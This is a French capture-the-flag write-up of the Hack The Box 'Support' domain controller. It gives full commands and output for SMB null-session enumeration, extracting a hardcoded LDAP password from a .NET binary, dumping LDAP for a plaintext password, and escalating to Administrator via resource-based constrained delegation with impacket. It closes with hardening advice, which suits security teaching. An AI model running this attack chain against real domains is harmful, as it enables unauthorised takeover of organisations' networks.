# HTB — Support · Windows · Easy

**IP :** `10.129.230.181` &nbsp;|&nbsp; **Date :** 28 Avril 2026 &nbsp;|&nbsp; **Outils :** nmap · smbclient · ILSpy · ldapsearch · evil-winrm · bloodhound · impacket

---

## Contexte

> Support est un Domain Controller Windows Server 2022. L'accès initial passe par un partage SMB anonyme contenant un binaire .NET dont le mot de passe LDAP est hardcodé. Un dump LDAP révèle les credentials de l'utilisateur `support` dans l'attribut `info`. L'escalade exploite les droits **GenericAll** du groupe `Shared Support Accounts` sur l'objet `DC$` via une attaque **RBCD (Resource-Based Constrained Delegation)**.

---

## Reconnaissance

### Scan de ports

```bash
nmap -sC -sV -A -p- 10.129.230.181
```

Ports clés :

```
53/tcp   → DNS
88/tcp   → Kerberos
389/tcp  → LDAP   (Domain: support.htb)
445/tcp  → SMB
5985/tcp → WinRM
```

Le profil de ports est sans ambiguïté : Domain Controller Windows. On ajoute les entrées DNS :

```bash
echo "10.129.230.181 dc.support.htb support.htb" | sudo tee -a /etc/hosts
```

### Énumération SMB (null session)

```bash
smbclient -N -L //10.129.230.181
```

```
ADMIN$         Remote Admin
C$             Default share
IPC$           Remote IPC
NETLOGON       Logon server share
support-tools  support staff tools   ← intéressant
SYSVOL         Logon server share
```

Le partage `support-tools` est accessible sans authentification.

```bash
smbclient -N //10.129.230.181/support-tools -c 'recurse; prompt; mget *'
```

Parmi les fichiers téléchargés : **`UserInfo.exe`** — un binaire .NET.

---

## Accès initial — Reverse engineering de UserInfo.exe

### Extraction des credentials LDAP

On ouvre `UserInfo.exe` avec **ILSpy** (ou dnSpy). Dans la fonction de connexion LDAP, le mot de passe est obfusqué mais facilement réversible — une clé XOR statique est hardcodée dans le binaire.

Credentials extraits :

```
Utilisateur : support\ldap
Mot de passe : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### Dump LDAP complet

```bash
ldapsearch -x -H ldap://support.htb \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" > ldap_full.txt
```

Dans le dump, l'attribut `info` de l'objet utilisateur `support` contient un mot de passe en clair :

```
info: Ironside47pleasure40Watchful
```

### Validation et shell WinRM

```bash
nxc smb 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
# [+] support.htb\support:Ironside47pleasure40Watchful

evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
# user_flag{**********************}
```

---

## Escalade de privilèges — RBCD (Resource-Based Constrained Delegation)

### Analyse BloodHound

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' \
  -d support.htb -ns 10.129.230.181 --collection All --zip
```

BloodHound révèle que le groupe **`Shared Support Accounts`** (dont `support` est membre) possède **GenericAll** sur l'objet ordinateur `DC$`.

GenericAll sur un computer object permet de modifier l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` — ce qui ouvre la voie à une attaque RBCD.

### Étape 1 — Création d'un faux computer account

```bash
impacket-addcomputer \
  -computer-name 'grokpc$' -computer-pass 'Password123!' \
  -dc-ip 10.129.230.181 \
  support.htb/support:Ironside47pleasure40Watchful
```

```
[*] Successfully added machine account grokpc$ with password Password123!
```

### Étape 2 — Configuration de la délégation RBCD

On indique au DC que `grokpc$` est autorisé à agir au nom d'autres utilisateurs sur `DC$` :

```bash
impacket-rbcd \
  -action write \
  -delegate-from 'grokpc$' -delegate-to 'DC$' \
  -dc-ip 10.129.230.181 \
  support.htb/support:Ironside47pleasure40Watchful
```

```
[*] grokpc$ can now impersonate users on DC$ via S4U2Proxy
```

### Étape 3 — Obtention d'un ticket Kerberos Administrator

```bash
impacket-getST \
  -spn 'cifs/dc.support.htb' \
  -impersonate Administrator \
  support.htb/grokpc$:Password123!
```

```
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

### Étape 4 — Shell Administrator

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

impacket-wmiexec -k -no-pass Administrator@dc.support.htb
```

```
C:\> whoami
support\administrator

C:\Users\Administrator\Desktop> type root.txt
# root_flag{**********************}
```

---

## Flags

```
user.txt  →  user_flag{**********************}
root.txt  →  root_flag{**********************}
```

---

## Chaîne d'attaque

| Phase | Technique | Outil | Détail |
|---|---|---|---|
| Reconnaissance | Port scan + profil DC | nmap | DNS, Kerberos, LDAP, SMB, WinRM |
| Énumération | Null session SMB | smbclient | Partage `support-tools` accessible |
| Analyse | Reverse .NET | ILSpy | Password LDAP hardcodé avec XOR |
| Accès initial | Dump LDAP + credential dans `info` | ldapsearch | `support:Ironside47pleasure40Watchful` |
| Accès user | WinRM | evil-winrm | Shell interactif |
| Analyse privesc | Cartographie AD | BloodHound | GenericAll sur DC$ |
| Escalade | RBCD via computer account | impacket | Ticket Kerberos Administrator |

---

## Ce que j'ai retenu

**Les binaires .NET sont facilement réversibles.** ILSpy décompile le code presque à l'identique du source original. Toute logique d'authentification dans un `.exe` .NET distribué est à considérer comme compromise.

**Les attributs LDAP `info` et `description` contiennent souvent des secrets.** Les admins y stockent des notes — et parfois des mots de passe. Un dump LDAP complet est systématique dès qu'on a des credentials de lecture.

**GenericAll sur un Computer Object = chemin vers DA.** L'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` peut être modifié par quiconque a GenericAll, ce qui suffit pour monter une attaque RBCD complète.

**`ms-DS-MachineAccountQuota` vaut 10 par défaut.** N'importe quel utilisateur du domaine peut créer jusqu'à 10 computer accounts — prérequis de cette attaque. Le mettre à 0 coupe ce vecteur.

---

## Hardening / Mitigations

- Mettre `ms-DS-MachineAccountQuota` à 0 :
  ```powershell
  Set-ADDomain (Get-ADDomain).DistinguishedName -Replace @{"ms-DS-MachineAccountQuota"="0"}
  ```
- Appliquer le principe du moindre privilège sur les ACL des objets AD critiques
- Surveiller les modifications de `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Ne jamais stocker de secrets dans les attributs `info` ou `description`
- Ajouter les comptes sensibles au groupe `Protected Users`

---

## Ressources

- [HackTricks — RBCD Attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
- [Impacket — rbcd.py](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [BloodHound — GenericAll abuse](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall)
